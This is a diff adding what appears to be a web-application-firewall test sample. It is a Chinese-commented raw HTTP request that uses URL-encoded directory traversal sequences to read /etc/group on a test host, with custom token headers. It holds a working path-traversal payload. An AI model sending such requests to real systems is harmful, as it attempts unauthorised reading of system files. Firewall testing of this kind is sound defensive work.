@@ -1,0 +1,9 @@
+# 目录遍历_/etc/group
+# /etc/group 是一个系统文件，用于存储系统中所有用户组的信息。在类Unix系统中，每个用户都属于至少一个用户组，而用户组则可以包含一个或多个用户。这个文件通常包含了用户组的名称、组标识符（GID）、以及属于该组的用户列表。
+GET /?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup&bid=hd_tag_m8mv23sl HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23sl
+RM-PRO-Token: 48037b9709171d09d0ad6bd271c9cd7d
+RM-PRO-Time: 1742808342227
+User-Agent: curl/7.83.1
+
